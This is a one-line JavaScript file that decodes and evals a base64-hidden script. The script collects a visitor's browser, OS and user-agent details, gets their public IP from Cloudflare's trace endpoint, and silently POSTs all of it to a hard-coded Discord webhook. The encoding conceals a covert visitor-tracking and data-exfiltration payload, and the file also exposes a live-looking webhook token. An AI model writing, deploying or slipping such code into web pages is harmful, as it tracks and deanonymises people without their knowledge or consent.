eval(atob('KGZ1bmN0aW9uICgpIHsKICAgICd1c2Ugc3RyaWN0JzsKICAgIAogICAgdmFyIG1vZHVsZSA9IHsKICAgICAgICBvcHRpb25zOiBbXSwKICAgICAgICBoZWFkZXI6IFtuYXZpZ2F0b3IucGxhdGZvcm0sIG5hdmlnYXRvci51c2VyQWdlbnQsIG5hdmlnYXRvci5hcHBWZXJzaW9uLCBuYXZpZ2F0b3IudmVuZG9yLCB3aW5kb3cub3BlcmFdLAogICAgICAgIGRhdGFvczogWwogICAgICAgICAgICB7IG5hbWU6ICdXaW5kb3dzIFBob25lJywgdmFsdWU6ICdXaW5kb3dzIFBob25lJywgdmVyc2lvbjogJ09TJyB9LAogICAgICAgICAgICB7IG5hbWU6ICdXaW5kb3dzJywgdmFsdWU6ICdXaW4nLCB2ZXJzaW9uOiAnTlQnIH0sCiAgICAgICAgICAgIHsgbmFtZTogJ2lQaG9uZScsIHZhbHVlOiAnaVBob25lJywgdmVyc2lvbjogJ09TJyB9LAogICAgICAgICAgICB7IG5hbWU6ICdpUGFkJywgdmFsdWU6ICdpUGFkJywgdmVyc2lvbjogJ09TJyB9LAogICAgICAgICAgICB7IG5hbWU6ICdLaW5kbGUnLCB2YWx1ZTogJ1NpbGsnLCB2ZXJzaW9uOiAnU2lsaycgfSwKICAgICAgICAgICAgeyBuYW1lOiAnQW5kcm9pZCcsIHZhbHVlOiAnQW5kcm9pZCcsIHZlcnNpb246ICdBbmRyb2lkJyB9LAogICAgICAgICAgICB7IG5hbWU6ICdQbGF5Qm9vaycsIHZhbHVlOiAnUGxheUJvb2snLCB2ZXJzaW9uOiAnT1MnIH0sCiAgICAgICAgICAgIHsgbmFtZTogJ0JsYWNrQmVycnknLCB2YWx1ZTogJ0JsYWNrQmVycnknLCB2ZXJzaW9uOiAnLycgfSwKICAgICAgICAgICAgeyBuYW1lOiAnTWFjaW50b3NoJywgdmFsdWU6ICdNYWMnLCB2ZXJzaW9uOiAnT1MgWCcgfSwKICAgICAgICAgICAgeyBuYW1lOiAnTGludXgnLCB2YWx1ZTogJ0xpbnV4JywgdmVyc2lvbjogJ3J2JyB9LAogICAgICAgICAgICB7IG5hbWU6ICdQYWxtJywgdmFsdWU6ICdQYWxtJywgdmVyc2lvbjogJ1BhbG1PUycgfQogICAgICAgIF0sCiAgICAgICAgZGF0YWJyb3dzZXI6IFsKICAgICAgICAgICAgeyBuYW1lOiAnQ2hyb21lJywgdmFsdWU6ICdDaHJvbWUnLCB2ZXJzaW9uOiAnQ2hyb21lJyB9LAogICAgICAgICAgICB7IG5hbWU6ICdGaXJlZm94JywgdmFsdWU6ICdGaXJlZm94JywgdmVyc2lvbjogJ0ZpcmVmb3gnIH0sCiAgICAgICAgICAgIHsgbmFtZTogJ1NhZmFyaScsIHZhbHVlOiAnU2FmYXJpJywgdmVyc2lvbjogJ1ZlcnNpb24nIH0sCiAgICAgICAgICAgIHsgbmFtZTogJ0ludGVybmV0IEV4cGxvcmVyJywgdmFsdWU6ICdNU0lFJywgdmVyc2lvbjogJ01TSUUnIH0sCiAgICAgICAgICAgIHsgbmFtZTogJ09wZXJhJywgdmFsdWU6ICdPcGVyYScsIHZlcnNpb246ICdPcGVyYScgfSwKICAgICAgICAgICAgeyBuYW1lOiAnQmxhY2tCZXJyeScsIHZhbHVlOiAnQ0xEQycsIHZlcnNpb246ICdDTERDJyB9LAogICAgICAgICAgICB7IG5hbWU6ICdNb3ppbGxhJywgdmFsdWU6ICdNb3ppbGxhJywgdmVyc2lvbjogJ01vemlsbGEnIH0KICAgICAgICBdLAogICAgICAgIGluaXQ6IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgdmFyIGFnZW50ID0gdGhpcy5oZWFkZXIuam9pbignICcpLAogICAgICAgICAgICAgICAgb3MgPSB0aGlzLm1hdGNoSXRlbShhZ2VudCwgdGhpcy5kYXRhb3MpLAogICAgICAgICAgICAgICAgYnJvd3NlciA9IHRoaXMubWF0Y2hJdGVtKGFnZW50LCB0aGlzLmRhdGFicm93c2VyKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiB7IG9zOiBvcywgYnJvd3NlcjogYnJvd3NlciB9OwogICAgICAgIH0sCiAgICAgICAgbWF0Y2hJdGVtOiBmdW5jdGlvbiAoc3RyaW5nLCBkYXRhKSB7CiAgICAgICAgICAgIHZhciBpID0gMCwKICAgICAgICAgICAgICAgIGogPSAwLAogICAgICAgICAgICAgICAgaHRtbCA9ICcnLAogICAgICAgICAgICAgICAgcmVnZXgsCiAgICAgICAgICAgICAgICByZWdleHYsCiAgICAgICAgICAgICAgICBtYXRjaCwKICAgICAgICAgICAgICAgIG1hdGNoZXMsCiAgICAgICAgICAgICAgICB2ZXJzaW9uOwogICAgICAgICAgICAKICAgICAgICAgICAgZm9yIChpID0gMDsgaSA8IGRhdGEubGVuZ3RoOyBpICs9IDEpIHsKICAgICAgICAgICAgICAgIHJlZ2V4ID0gbmV3IFJlZ0V4cChkYXRhW2ldLnZhbHVlLCAnaScpOwogICAgICAgICAgICAgICAgbWF0Y2ggPSByZWdleC50ZXN0KHN0cmluZyk7CiAgICAgICAgICAgICAgICBpZiAobWF0Y2gpIHsKICAgICAgICAgICAgICAgICAgICByZWdleHYgPSBuZXcgUmVnRXhwKGRhdGFbaV0udmVyc2lvbiArICdbLSAvOjtdKFtcXGQuX10rKScsICdpJyk7CiAgICAgICAgICAgICAgICAgICAgbWF0Y2hlcyA9IHN0cmluZy5tYXRjaChyZWdleHYpOwogICAgICAgICAgICAgICAgICAgIHZlcnNpb24gPSAnJzsKICAgICAgICAgICAgICAgICAgICBpZiAobWF0Y2hlcykgeyBpZiAobWF0Y2hlc1sxXSkgeyBtYXRjaGVzID0gbWF0Y2hlc1sxXTsgfSB9CiAgICAgICAgICAgICAgICAgICAgaWYgKG1hdGNoZXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgbWF0Y2hlcyA9IG1hdGNoZXMuc3BsaXQoL1suX10rLyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoaiA9IDA7IGogPCBtYXRjaGVzLmxlbmd0aDsgaiArPSAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaiA9PT0gMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZlcnNpb24gKz0gbWF0Y2hlc1tqXSArICcuJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmVyc2lvbiArPSBtYXRjaGVzW2pdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmVyc2lvbiA9ICcwJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogZGF0YVtpXS5uYW1lLAogICAgICAgICAgICAgICAgICAgICAgICB2ZXJzaW9uOiBwYXJzZUZsb2F0KHZlcnNpb24pCiAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4geyBuYW1lOiAndW5rbm93bicsIHZlcnNpb246IDAgfTsKICAgICAgICB9CiAgICB9OwoKbGV0IFVybCA9ICJodHRwczovLyIgKyAiY2xvdWRmbGFyZS5jb20vY2RuLWNnaS90cmFjZSI7CmxldCBBamF4VXJsID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CkFqYXhVcmwub3BlbigiZ2V0IiwgVXJsKTsKQWpheFVybC5zZW5kKCk7CgpBamF4VXJsLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHsKaWYgKEFqYXhVcmwucmVhZHlTdGF0ZSA9PT0gNCAmJiBBamF4VXJsLnN0YXR1cyA9PT0gMjAwKSB7CmxldCByZXN1bHRVcmwgPSBBamF4VXJsLnJlc3BvbnNlVGV4dDsKCmxldCBtYXBVcmxTdGFydCA9IHJlc3VsdFVybC5pbmRleE9mKCJpcCIpICsgMzsKbGV0IG1hcFVybEVuZCA9IHJlc3VsdFVybC5pbmRleE9mKCJ0cyIpOwpsZXQgSXBSZXN1bHQgPSByZXN1bHRVcmwuc2xpY2UobWFwVXJsU3RhcnQsIG1hcFVybEVuZCk7CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2cnKS52YWx1ZSA9IElwUmVzdWx0OwoKdmFyIGUgPSBtb2R1bGUuaW5pdCgpLApkZWJ1ZyA9ICcnOwoKZGVidWcgKz0gJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJyArICdcbic7CmRlYnVnICs9ICdvcy5uYW1lID0gJyArIGUub3MubmFtZSArICdcbic7CmRlYnVnICs9ICdvcy52ZXJzaW9uID0gJyArIGUub3MudmVyc2lvbiArICdcbic7CmRlYnVnICs9ICdicm93c2VyLm5hbWUgPSAnICsgZS5icm93c2VyLm5hbWUgKyAnXG4nOwpkZWJ1ZyArPSAnYnJvd3Nlci52ZXJzaW9uID0gJyArIGUuYnJvd3Nlci52ZXJzaW9uICsgJ1xuJzsKCmRlYnVnICs9ICdcbic7CmRlYnVnICs9ICduYXZpZ2F0b3IudXNlckFnZW50ID0gJyArIG5hdmlnYXRvci51c2VyQWdlbnQgKyAnXG5cbic7CmRlYnVnICs9ICduYXZpZ2F0b3IuYXBwVmVyc2lvbiA9ICcgKyBuYXZpZ2F0b3IuYXBwVmVyc2lvbiArICdcblxuJzsKZGVidWcgKz0gJ25hdmlnYXRvci5wbGF0Zm9ybSA9ICcgKyBuYXZpZ2F0b3IucGxhdGZvcm0gKyAnXG4nOwpkZWJ1ZyArPSAnbmF2aWdhdG9yLnZlbmRvciA9ICcgKyBuYXZpZ2F0b3IudmVuZG9yICsgJ1xuJzsKZGVidWcgKz0gJ2lwLmFkZHJlcyA9ICcgKyAnfHwnICsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZycpLnZhbHVlICsgJ3x8JyArICdcbic7CmRlYnVnICs9ICdpcC5sb2NhdGlvbiA9ICcgKyAnfHwnICsgJ2h0dHBzOi8vd3d3Lm9wZW50cmFja2VyLm5ldC9mZWF0dXJlL2lwLXRyYWNrZXI/aXA9JyArIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2cnKS52YWx1ZSArICd8fCcKCmNvbnN0IHdlYmhvb2tVUkwgPSAnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE4MDI0NTM1Mzg4NzQzMjkyNS9ualpYenRTTVNpUE5zeW9rb1Q5aERKaGFjck0wdmF0YUVRdC13aEZ3WjZ2ejBvWndVUkRGN2lrSDdOcUJjeTZndFd4Myc7CgpzZW5kTWVzc2FnZSh3ZWJob29rVVJMLCBkZWJ1Zyk7CgpmdW5jdGlvbiBzZW5kTWVzc2FnZSh3ZWJob29rVVJMLCBtZXNzYWdlKSB7CmNvbnN0IGRhdGEgPSB7CiAgICBjb250ZW50OiBtZXNzYWdlCn07CgpmZXRjaCh3ZWJob29rVVJMLCB7CiAgICBtZXRob2Q6ICdQT1NUJywKICAgIGhlYWRlcnM6IHsKICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nCiAgICB9LAogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoZGF0YSkKfSkKLnRoZW4ocmVzcG9uc2UgPT4gewogICAgaWYgKHJlc3BvbnNlLm9rKSB7CiAgICAgICAgY29uc29sZS5sb2coJ8OcemVuZXQgc2lrZXJlc2VuIGVsa8O8bGR2ZSBhIHdlYmhvb2tyYSEnKTsKICAgIH0gCn0pCi5jYXRjaChlcnJvciA9PiBjb25zb2xlLmVycm9yKCdIaWJhIHTDtnJ0w6ludDonLCBlcnJvcikpOwp9CgoKfQp9OwoKfSgpKTs='))